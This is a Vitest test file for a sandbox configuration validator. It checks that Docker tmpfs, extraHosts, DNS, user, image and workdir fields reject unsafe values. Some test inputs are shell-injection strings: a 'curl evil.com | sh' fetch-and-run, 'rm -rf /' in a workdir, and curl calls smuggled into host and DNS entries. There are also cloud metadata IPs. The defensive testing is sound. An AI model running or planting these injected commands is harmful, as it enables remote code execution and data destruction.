import { describe, expect, it, vi } from "vitest";

const { validateConfigObject } = await vi.importActual<typeof import("./config.js")>("./config.js");

describe("sandbox container hardening schema", () => {
  // ═══════════════════════════════════════════════════════════════════════
  // SBX-MEDIUM-01: tmpfs validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.tmpfs — validated mount entries", () => {
    it("accepts valid tmpfs entries with paths only", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["/tmp", "/var/tmp", "/run"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts tmpfs entries with safe options", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["/tmp:size=100m,noexec,nosuid"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("rejects tmpfs entries with exec option (weakens isolation)", () => {
      // 'exec' without 'no' prefix is not in allowed options list
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["/tmp:exec,suid"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects tmpfs entries with non-absolute paths", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["relative/path"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // SBX-MEDIUM-01 (cont): extraHosts validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.extraHosts — validated host entries", () => {
    it("accepts valid hostname:ipv4 entries", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["myhost:192.168.1.1"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts valid hostname:ipv6 entries", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["myhost:2001:db8::1"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("rejects cloud metadata IP (169.254.169.254 — AWS/GCP/Azure SSRF)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["metadata.google.internal:169.254.169.254"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects EC2 IPv6 metadata endpoint (fd00:ec2::254)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["metadata:fd00:ec2::254"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects malformed extraHosts entries (no colon)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["just-a-hostname"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects extraHosts with shell injection", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["evil;curl http://bad.com:1.2.3.4"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // DNS validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.dns — validated IP addresses", () => {
    it("accepts valid IPv4 DNS server", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { dns: ["8.8.8.8", "1.1.1.1"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts valid IPv6 DNS server", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { dns: ["2001:4860:4860::8888"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("rejects hostname as DNS (only IPs allowed)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { dns: ["evil.dns.attacker.com"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects DNS entry with shell injection", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { dns: ["8.8.8.8; curl evil.com"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // SBX-MEDIUM-03: user field validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.user — blocks root", () => {
    it("rejects user=root", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "root" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects user=Root (case insensitive)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "Root" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects user=0 (numeric root)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "0" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects user=0:0 (root:root)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "0:0" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects user=0:1000 (root user with non-root group)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "0:1000" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("accepts non-root user name", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "sandbox" },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts numeric non-root user", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "1000" },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts user:group format for non-root", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "1000:1000" },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Cross-layer regression: docker image and workspace security
  // (Primary tests in config.schema-security-hardening.test.ts)
  // ═══════════════════════════════════════════════════════════════════════

  describe("regression — docker image and workspace path security", () => {
    it("rejects shell injection in docker image", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { image: "; curl evil.com | sh" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects shell injection in workdir", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { workdir: "/workspace; rm -rf /" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });
});
